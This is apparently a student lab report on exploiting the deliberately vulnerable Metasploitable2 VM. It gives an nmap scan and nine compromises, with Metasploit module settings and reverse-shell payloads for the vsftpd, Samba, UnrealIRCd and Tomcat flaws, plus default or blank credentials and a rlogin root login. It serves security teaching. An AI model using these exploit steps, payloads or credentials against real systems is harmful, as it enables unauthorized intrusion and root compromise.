# Metasploitable2 Exploitation Report

**Name:** Nayram Banyie Mawah
**Index Number:** 4191624
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework 6.4.135-dev, nmap 7.99

---

## Reconnaissance Summary

Command used: `nmap -sV -sC 192.168.1.3`

Full scan saved in `evidence/recon.txt`. Summary of key findings: 23 open TCP ports
were discovered, spanning FTP (vsftpd 2.3.4), SSH (OpenSSH 4.7p1), Telnet, SMTP
(Postfix), DNS (BIND 9.4.2), HTTP (Apache 2.2.8), RPC services, Samba (SMB 3.0.20),
rsh/rlogin, Java RMI, a bindshell on port 1524, NFS, MySQL 5.0.51a, PostgreSQL 8.3,
VNC, X11, IRC (UnrealIRCd), and two web/app servers on ports 8009/8180 (Tomcat).
Several of these are known-vulnerable legacy versions, forming the basis for the
exploits documented below.

```
# Nmap 7.99 scan initiated Sun Sep 20 07:40:27 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN recon.txt 192.168.1.3
Nmap scan report for 192.168.1.3
Host is up (0.00048s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_ssl-date: 2026-09-20T11:40:49+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      38763/tcp   mountd
|   100005  1,2,3      49036/udp   mountd
|   100021  1,3,4      35504/tcp   nlockmgr
|   100021  1,3,4      46262/udp   nlockmgr
|   100024  1          52949/udp   status
|_  100024  1          58578/tcp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 21
|   Capabilities flags: 43564
|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolNew, SupportsCompression
|   Status: Autocommit
|_  Salt: ].lT@&9/{D}j{KEXk2S,
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-09-20T11:40:49+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
MAC Address: 08:00:27:8B:C5:FE (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h00m00s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-09-20T07:40:41-04:00
|_smb2-time: Protocol negotiation failed (SMB2)


```

---

## Exploit 1: vsftpd 2.3.4 Backdoor Command Execution

- **Service / Port:** FTP / 21
- **Vulnerability:** Malicious backdoor planted in vsftpd 2.3.4 source (CVE-2011-2523) — a crafted
  username triggers a root shell on port 6200 instead of processing the login.
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** Nmap's service scan fingerprinted the exact vulnerable version (vsftpd 2.3.4)
  running on port 21. Metasploit has a purpose-built module specifically for this backdoor, so rather
  than manually crafting the malicious username string and handling the raw socket interaction myself,
  the module automates detection (AutoCheck confirms the banner is vulnerable), triggers the backdoor,
  and wires up a Meterpreter session automatically.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified vsftpd 2.3.4 on port 21 (Reconnaissance)
  2. `msfconsole` then `search vsftpd` — found `exploit/unix/ftp/vsftpd_234_backdoor` (Weaponization)
  3. `use 1`, `set RHOSTS 192.168.1.3`, `set LHOST 192.168.1.4`
  4. `run` — module confirmed the vulnerable banner, triggered the backdoor (Delivery/Exploitation),
     and opened a Meterpreter session (Installation/C2)
  5. `getuid` confirmed root access; `sysinfo` confirmed target OS details (Actions on Objectives)
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** the nmap scan identified the exact vulnerable service version.
  - **Weaponization:** selecting and configuring the matching Metasploit module/payload for that version.
  - **Delivery:** the module connecting to port 21 and sending the crafted backdoor trigger.
  - **Exploitation:** the backdoor code actually firing on the target, spawning a shell.
  - **Installation:** the Meterpreter payload establishing itself as a running foothold on the target.
  - **C2:** the live Meterpreter session itself, giving ongoing remote control of the target.
  - **Actions on Objectives:** running `getuid`/`sysinfo` to confirm and use the access obtained.
- **Outcome / Impact:** Full unauthenticated remote code execution as root — the highest possible
  privilege level, with zero credentials required.

---
## Exploit 2: Samba "username map script" Command Execution

- **Service / Port:** SMB / 139, 445
- **Vulnerability:** Samba versions before 3.0.20 process the `username map script` config option
  unsafely, allowing shell metacharacters in a login attempt to be passed through to a shell and
  executed (CVE-2007-2447).
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** Nmap fingerprinted Samba smbd 3.0.20-Debian on ports 139/445, a version known to
  be vulnerable to this specific command injection flaw. The module automates crafting the malicious
  login string needed to trigger the injection, rather than requiring manual construction of the
  raw SMB authentication packet.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified Samba smbd 3.0.20-Debian on ports 139/445 (Reconnaissance)
  2. `msfconsole` then `search usermap` — found `exploit/multi/samba/usermap_script` (Weaponization)
  3. `use 0`, `set RHOSTS 192.168.1.3` (LHOST was already set from the previous exploit)
  4. `run` — module sent the crafted login triggering command injection (Delivery/Exploitation),
     opening a command shell session (Installation/C2)
  5. `whoami`, `id`, `uname -a` confirmed root access and target details (Actions on Objectives)
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** nmap identified the specific vulnerable Samba version.
  - **Weaponization:** selecting the matching Metasploit module for this exact CVE.
  - **Delivery:** the module sending the crafted authentication request containing the injection payload.
  - **Exploitation:** the unsafe config option executing the injected shell command.
  - **Installation:** the reverse shell payload establishing a running connection back to the attacker.
  - **C2:** the open command shell session providing ongoing control of the target.
  - **Actions on Objectives:** running whoami/id/uname -a to confirm and use the access obtained.
- **Outcome / Impact:** Full unauthenticated remote command execution as root via a command injection
  vulnerability in Samba's configuration handling.

---
## Exploit 3: UnrealIRCd 3.2.8.1 Backdoor Command Execution

- **Service / Port:** IRC / 6667
- **Vulnerability:** A malicious backdoor was planted in the UnrealIRCd 3.2.8.1 source distribution
  (CVE-2010-2075) — sending a specially crafted string to the IRC server executes it as a shell
  command.
- **Tool Used:** Metasploit — exploit/unix/irc/unreal_ircd_3281_backdoor
- **Why This Tool:** Nmap fingerprinted UnrealIRCd running on port 6667, a version known to contain
  this planted backdoor. The default staged Meterpreter payload for this module failed to complete
  the connection on this run (likely due to the HTTP payload-fetch stage timing out), so the payload
  was switched to `cmd/unix/reverse` — a simpler, single-stage reverse shell that doesn't require the
  target to fetch a second-stage payload over HTTP, making it more reliable on constrained lab networks.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified UnrealIRCd on port 6667 (Reconnaissance)
  2. `msfconsole` then `search unreal` — found `exploit/unix/irc/unreal_ircd_3281_backdoor` (Weaponization)
  3. `use exploit/unix/irc/unreal_ircd_3281_backdoor`, `set RHOSTS 192.168.1.3`
  4. `set PAYLOAD cmd/unix/reverse`, `set LHOST 192.168.1.4` — switched to a simpler payload after
     the default staged payload failed to establish a session
  5. `run` — module registered a fake IRC user to trigger detection, confirmed the vulnerable version,
     then sent the backdoor command (Delivery/Exploitation), opening a command shell session (Installation/C2)
  6. `whoami`, `id`, `uname -a` confirmed root access (Actions on Objectives)
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** nmap identified the IRC service and its version.
  - **Weaponization:** selecting the matching backdoor module and choosing a payload suited to the
    network conditions.
  - **Delivery:** the module connecting to port 6667 and sending the crafted IRC registration/backdoor string.
  - **Exploitation:** the planted backdoor code executing the delivered command.
  - **Installation:** the reverse shell establishing a running connection back to the attacker.
  - **C2:** the open command shell session providing ongoing control of the target.
  - **Actions on Objectives:** confirming and using root access via whoami/id/uname -a.
- **Outcome / Impact:** Full unauthenticated remote command execution as root via a second distinct
  planted backdoor, on a service unrelated to the FTP or Samba vulnerabilities already exploited.

---
## Exploit 4: Anonymous FTP Login

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 on this target is configured to accept anonymous logins
  (no CVE — this is a misconfiguration, not a code vulnerability), granting unauthenticated
  read access to the server's FTP directory.
- **Tool Used:** Built-in `ftp` command-line client (no Metasploit module needed).
- **Why This Tool:** Nmap's `ftp-anon` script had already flagged "Anonymous FTP login allowed"
  during reconnaissance. Since this is a simple authentication bypass rather than a code-level
  exploit, no exploit module is needed — the standard `ftp` client is sufficient to demonstrate
  and use the misconfiguration directly, showing that not every finding requires a Metasploit
  module to exploit.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — nmap's `ftp-anon` script flagged anonymous login as allowed (Reconnaissance)
  2. `ftp 192.168.1.3` — connected directly to the FTP service (Delivery)
  3. Logged in with username `anonymous` and a blank/arbitrary password (Exploitation — the
     authentication check accepted access with no valid credentials)
  4. `ls -la` — confirmed a real, browsable session was granted, listing the FTP root directory
     with its actual ownership/permissions (Actions on Objectives)
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - **Reconnaissance:** nmap's script scan identified the anonymous-login misconfiguration ahead of time.
  - **Delivery:** connecting directly to the FTP service using the standard client.
  - **Exploitation:** the server accepting an anonymous login as valid, bypassing real authentication.
  - **Actions on Objectives:** browsing the granted directory to confirm the extent of access obtained.
  - *(No Weaponization/Installation/C2 stage applies here — this is a direct, single-session
    protocol-level access, not a payload delivery or persistent foothold.)*
- **Outcome / Impact:** Unauthenticated read access to the FTP server's directory tree. In this
  instance the directory was empty, but the same misconfiguration on a server with sensitive
  files exposed would allow full unauthorized data disclosure.

---
## Exploit 5: Telnet Weak Default Credentials

- **Service / Port:** Telnet / 23
- **Vulnerability:** No CVE — this is a weak-credential/misconfiguration issue. The target ships
  with a well-known default account (`msfadmin`/`msfadmin`), and Telnet itself transmits the
  entire login session, including the password, in plaintext with no encryption.
- **Tool Used:** Built-in `telnet` command-line client (no Metasploit module needed).
- **Why This Tool:** Nmap identified an open Telnet service on port 23. Since the target uses a
  documented default credential rather than a software vulnerability, a direct login via the
  standard telnet client is the correct approach — no exploit module is needed to bypass
  authentication when the "vulnerability" is simply weak/default credentials.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified an open Telnet service on port 23 (Reconnaissance)
  2. `telnet 192.168.1.3` — connected directly to the service (Delivery)
  3. Logged in using the known default credentials `msfadmin` / `msfadmin` (Exploitation —
     authentication succeeded using a weak, guessable/default credential)
  4. `whoami`, `id`, `uname -a` confirmed a standard user shell was obtained (Actions on Objectives)
- **Evidence:** evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - **Reconnaissance:** nmap identified the open Telnet service ahead of the login attempt.
  - **Delivery:** connecting to the service using the standard telnet client.
  - **Exploitation:** successful authentication using a weak default credential, granting an
    interactive shell.
  - **Actions on Objectives:** confirming the access level obtained (a standard user, not root).
  - *(No Weaponization/Installation/C2 — same reasoning as the anonymous FTP exploit: this is a
    direct interactive login, not a delivered payload or persistent foothold.)*
- **Outcome / Impact:** Interactive shell access as a standard user (`msfadmin`, uid 1000) via
  weak default credentials transmitted in plaintext. Unlike Exploits 1–3, this does not grant
  root directly — a real attacker would need a separate privilege escalation step from here to
  reach full system control.

---
## Exploit 6: PostgreSQL Default Credentials

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** No CVE — a weak-credential misconfiguration. The target's PostgreSQL
  installation uses the default account `postgres`/`postgres`, a widely known default that was
  never changed after installation.
- **Tool Used:** Metasploit — auxiliary/scanner/postgres/postgres_login
- **Why This Tool:** Nmap identified PostgreSQL 8.3 running on port 5432. Rather than manually
  scripting a connection attempt, this auxiliary module automates credential testing against the
  service and, with `CreateSession true`, opens a live interactive database session on success —
  letting the actual data access be demonstrated directly rather than just confirming a login worked.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified PostgreSQL 8.3.0-8.3.7 on port 5432 (Reconnaissance)
  2. `msfconsole` then `search postgres_login` — found `auxiliary/scanner/postgres/postgres_login` (Weaponization)
  3. `use 0`, `set RHOSTS 192.168.1.3`, `set USERNAME postgres`, `set PASSWORD postgres`,
     `set STOP_ON_SUCCESS true`
  4. `run` — confirmed the default credentials work (Delivery/Exploitation)
  5. `set CreateSession true`, `run` again — opened a live PostgreSQL session (Installation/C2)
  6. `sessions -i 1`, then `query "SELECT datname FROM pg_database;"` — ran a real SQL query,
     confirming actual data access, not just a successful login (Actions on Objectives)
- **Evidence:** evidence/exploit6.png (login), evidence/exploit6b.png (query result)
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** nmap identified the exposed PostgreSQL service and version.
  - **Weaponization:** selecting and configuring the credential-testing module for this target.
  - **Delivery:** sending the login attempt to the PostgreSQL service.
  - **Exploitation:** the weak default credential being accepted as valid.
  - **Installation:** the module opening a persistent interactive database session.
  - **C2:** the live session allowing ongoing, repeatable command/query access to the target database.
  - **Actions on Objectives:** running a real SQL query to extract actual data from the target.
- **Outcome / Impact:** Full unauthenticated database access via default credentials, demonstrated
  with a live SQL query returning real database names — proving actual data exposure, not just
  theoretical login success.

---
## Exploit 7: Apache Tomcat Manager Default Credentials — Malicious WAR Deployment

- **Service / Port:** HTTP (Tomcat) / 8180
- **Vulnerability:** No CVE — a weak-credential misconfiguration. The Tomcat manager application
  is left accessible with default credentials (`tomcat`/`tomcat`), allowing any authenticated
  manager user to deploy arbitrary web applications (WAR files) to the server, which Tomcat then
  executes as server-side code.
- **Tool Used:** Metasploit — exploit/multi/http/tomcat_mgr_upload
- **Why This Tool:** Nmap identified Apache Tomcat/Coyote on port 8180. This module automates the
  full attack chain specific to Tomcat manager abuse: authenticating with the manager interface,
  packaging a malicious payload into a valid WAR file, uploading and deploying it through the
  legitimate manager API, triggering execution, then cleaning up by undeploying it — a sequence
  that would be tedious and error-prone to script manually. As with Exploit 3, the default staged
  Meterpreter payload failed to establish a session, so it was swapped for `java/shell_reverse_tcp`,
  a simpler single-stage payload, which succeeded.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified Apache Tomcat/Coyote JSP engine on port 8180 (Reconnaissance)
  2. `msfconsole` then `search tomcat_mgr` — found `exploit/multi/http/tomcat_mgr_upload` (Weaponization)
  3. `use exploit/multi/http/tomcat_mgr_upload`, `set RHOSTS 192.168.1.3`, `set RPORT 8180`,
     `set HttpUsername tomcat`, `set HttpPassword tomcat`
  4. `set PAYLOAD java/shell_reverse_tcp`, `set LHOST 192.168.1.4` — switched payload after the
     default staged payload failed to open a session
  5. `run` — authenticated to the manager app, uploaded and deployed a malicious WAR file, executed
     it (Delivery/Exploitation), opening a command shell session (Installation/C2), then undeployed
     the app to clean up
  6. `whoami`, `id`, `uname -a` confirmed shell access as the `tomcat55` service account (Actions on Objectives)
- **Evidence:** evidence/exploit7.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - **Reconnaissance:** nmap identified the exposed Tomcat manager service.
  - **Weaponization:** packaging the payload into a valid WAR file and configuring credentials/module.
  - **Delivery:** uploading the malicious WAR file through the manager's legitimate upload API.
  - **Exploitation:** Tomcat executing the deployed application as server-side code.
  - **Installation:** the reverse shell establishing a running connection back to the attacker.
  - **C2:** the open command shell session providing ongoing control of the target.
  - **Actions on Objectives:** confirming access level via whoami/id/uname -a.
- **Outcome / Impact:** Remote code execution as the `tomcat55` service account via legitimate
  administrative functionality (application deployment) abused with default credentials — a
  different attack technique from any prior exploit, since it uses a trusted admin feature rather
  than a backdoor or a bare authentication bypass.

---
## Exploit 8: MySQL Blank Root Password

- **Service / Port:** MySQL / 3306
- **Vulnerability:** No CVE — a weak-credential misconfiguration. The MySQL root account has no
  password set at all, allowing unauthenticated administrative access to the database server.
- **Tool Used:** Native `mysql` command-line client (`--skip-ssl` flag), after Metasploit's
  `auxiliary/scanner/mysql/mysql_login` module failed due to a protocol incompatibility with this
  MySQL version's old authentication handshake.
- **Why This Tool:** Nmap identified MySQL 5.0.51a on port 3306. The Metasploit login-scanner
  module returned a low-level protocol error (`scramble_length` mismatch) caused by version
  incompatibility between the module and this old MySQL release, rather than any actual barrier
  to access. Switching to the native `mysql` client (with `--skip-ssl`, since this legacy server
  doesn't support the TLS negotiation modern clients attempt by default) connected cleanly,
  demonstrating that a manual approach can succeed where an automated module hits compatibility
  issues — and that troubleshooting the *tool*, not just the target, is sometimes part of the process.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified MySQL 5.0.51a-3ubuntu5 on port 3306 (Reconnaissance)
  2. Attempted `auxiliary/scanner/mysql/mysql_login` in Metasploit; failed due to a protocol
     version mismatch, not a credential failure (Weaponization attempt)
  3. `mysql -h 192.168.1.3 -u root --skip-ssl` — connected directly with the native client,
     disabling the SSL negotiation this legacy server doesn't support (Delivery)
  4. Login succeeded immediately with no password prompt, confirming the blank root password
     (Exploitation)
  5. `SHOW DATABASES;` — listed all databases on the server, confirming real administrative
     access (Actions on Objectives)
- **Evidence:** evidence/exploit8.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - **Reconnaissance:** nmap identified the exposed MySQL service and its version.
  - **Delivery:** connecting to the service using the native MySQL client.
  - **Exploitation:** the server granting root access with no password required.
  - **Actions on Objectives:** listing all databases to confirm full administrative visibility.
  - *(No Weaponization/Installation/C2 — similar to Exploits 4/5, this is a direct interactive
    login using a legitimate client, not a delivered payload or persistent foothold.)*
- **Outcome / Impact:** Full unauthenticated administrative access to the MySQL server, including
  visibility into all 7 hosted databases — a complete compromise of the database layer.

---
## Exploit 9: rlogin Trust-Based Root Login

- **Service / Port:** rlogin / 513
- **Vulnerability:** No CVE — a trust-relationship misconfiguration. The target's `.rhosts`/hosts.equiv
  configuration trusts incoming rlogin connections (in this case, as root) without requiring any
  password at all, based purely on the claimed source host/username.
- **Tool Used:** Native `rlogin` command-line client (no Metasploit module needed).
- **Why This Tool:** Nmap identified an open rlogin service on port 513. This is not a software bug
  or a weak password to crack — it's an inherently trust-based protocol, so demonstrating the
  vulnerability means simply using the protocol as designed and observing that no authentication
  challenge occurs at all. No exploit module is needed or applicable here.
- **Steps:**
  1. `nmap -sV -sC 192.168.1.3` — identified an open rlogin service on port 513 (Reconnaissance)
  2. `rlogin -l root 192.168.1.3` — attempted to log in as root via rlogin (Delivery)
  3. The target granted an interactive root shell immediately, with no password prompt whatsoever
     (Exploitation — the trust-based authentication model accepted the connection outright)
  4. `whoami`, `id`, `uname -a` confirmed full root access (Actions on Objectives)
- **Evidence:** evidence/exploit9.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - **Reconnaissance:** nmap identified the exposed rlogin service.
  - **Delivery:** initiating the rlogin connection claiming the root identity.
  - **Exploitation:** the misconfigured trust relationship granting access with no credential check.
  - **Actions on Objectives:** confirming full root access via whoami/id/uname -a.
  - *(No Weaponization/Installation/C2 — this is a direct protocol-level trust bypass, not a
    delivered payload or persistent foothold; the interactive rlogin session itself is the access.)*
- **Outcome / Impact:** Immediate, fully unauthenticated root access — no password, no exploit
  code, no vulnerability to trigger. This demonstrates that misconfigured trust relationships can
  be more severe and easier to abuse than actual software vulnerabilities.

---
